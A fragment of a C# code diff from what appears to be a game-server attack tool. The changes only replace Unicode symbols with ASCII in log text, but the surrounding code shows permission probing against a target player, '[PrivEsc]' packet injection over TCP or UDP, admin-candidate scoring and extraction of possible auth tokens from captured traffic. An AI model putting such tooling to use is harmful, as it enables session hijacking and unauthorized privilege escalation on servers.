+            _crtSummary = $"Done - ALLOW:{allow}  DENY:{deny}  SILENCE:{silence}  KICK:{kick}";
             _log.Success($"[CmdTable] Probe complete. {_crtSummary}");
         });
     }
@@ -2324,14 +2324,14 @@ public class PrivilegeTab : ITab
                              : ProbeResult.Silence;
             }
             _crtCurrentProbe = -1;
-            _log.Info($"[CmdTable] Single '{probe.Node}' → {ResultLabel(probe.Result)}");
+            _log.Info($"[CmdTable] Single '{probe.Node}' -> {ResultLabel(probe.Result)}");
         });
     }
 
     private void ExportProbeLog()
     {
         var sb = new System.Text.StringBuilder();
-        sb.AppendLine($"# Command Response Table  —  {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
+        sb.AppendLine($"# Command Response Table  -  {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
         sb.AppendLine($"# Target: {(_targetPlayerName.Length > 0 ? _targetPlayerName : _targetPlayerId > 0 ? _targetPlayerId.ToString() : "none")}");
         sb.AppendLine();
         sb.AppendLine($"{"Permission Node",-24} {"Result",-10} Response");
@@ -2402,7 +2402,7 @@ public class PrivilegeTab : ITab
         bool ok = _capture.InjectToServer(data).GetAwaiter().GetResult();
         if (ok) { _log.Info($"[PrivEsc] {data.Length}b injected via TCP."); return; }
 
-        _log.Warn("[PrivEsc] No live session — sending direct UDP...");
+        _log.Warn("[PrivEsc] No live session - sending direct UDP...");
         try
         {
             using var udp = new UdpClient();
@@ -2446,7 +2446,7 @@ public class AdminCandidate
     public int     Score    { get; set; }
 }
 
-/// <summary>A high-entropy byte run extracted from a captured packet — potential auth token.</summary>
+/// <summary>A high-entropy byte run extracted from a captured packet - potential auth token.</summary>
 public sealed class TokenEntry
 {
     public byte             Opcode    { get; set; }
